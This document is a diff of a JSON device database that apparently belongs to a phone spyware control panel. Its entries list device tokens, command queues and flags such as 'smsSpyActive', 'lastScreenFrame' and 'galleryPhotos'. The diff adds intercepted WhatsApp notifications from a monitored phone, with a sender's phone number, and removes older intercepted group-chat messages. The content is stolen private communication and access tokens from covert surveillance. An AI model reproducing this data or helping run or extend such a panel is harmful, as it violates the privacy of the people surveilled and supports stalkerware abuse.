@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777349522783,
+    "lastSeen": 1777349525784,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -450,7 +450,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777349522886,
+    "lastSeen": 1777349524942,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -466,6 +466,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "‎9 pesan baru",
+        "time": "28/04 11:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349526175
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "📷 Foto",
+        "time": "28/04 11:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349526094
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "‎9 pesan baru",
+        "time": "28/04 11:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349523970
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "📷 Foto",
+        "time": "28/04 11:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349523962
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "‎5 pesan baru",
+        "time": "28/04 11:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777349523955
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 852-3694-0729",
@@ -4425,46 +4465,6 @@
         "time": "27/04 18:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1777290058865
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎jb|| All GAME JAWAA (134 pesan): Menyebut Anda",
-        "content": "~ JB RORONDA STORE: BOT JAGA GRUP MANEN 5K MINAT PM",
-        "time": "27/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290058442
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GC STOK RECEH👻 (3 pesan): ~ CEES ELIT",
-        "content": "💟 Stiker",
-        "time": "27/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290054453
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎146 pesan dari 3 chat",
-        "time": "27/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290054449
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎145 pesan dari 3 chat",
-        "time": "27/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290054346
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GC STOK RECEH👻 (2 pesan): ~ CEES ELIT",
-        "content": "💟 Stiker",
-        "time": "27/04 18:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290054243
       }
     ],
     "galleryPhotos": [],
@@ -4483,7 +4483,7 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777349520846,
+    "lastSeen": 1777349523752,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
